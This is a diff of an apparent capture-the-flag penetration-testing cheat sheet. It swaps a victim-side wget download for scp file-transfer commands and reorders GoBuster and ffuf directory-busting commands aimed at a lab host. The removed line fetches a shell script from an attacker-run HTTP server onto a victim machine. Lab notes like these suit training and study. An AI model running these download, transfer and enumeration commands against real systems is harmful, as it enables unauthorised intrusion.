@@ -66,9 +66,16 @@ python3 -m http.server 8888
 python -m SimpleHTTPServer 8888
 ```
 
-*Victim:* 
+* #### With SCP
+
+*Copy from host*
 ```
-wget http://10.10.10.10:8888/something.sh -O something.sh
+scp user@10.10.10.77:/home/user/file.txt /home/kali/
+```
+
+*Copy to host* 
+```
+scp -r /home/kali/file.txt user@10.10.10.77:/home/user/
 ```
 
 ### Reverse shells
@@ -109,17 +116,15 @@ nmap -sU -sV -p- 10.10.10.77
 
 ### If Web Server
 
-* #### GoBuster
-
 Full directory busting with extensions
+
+* #### GoBuster
 
 ```
 gobuster dir -e -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,302
 ```
 
 * #### FuFF
-
-Full directory busting with extensions
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://academy.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,302
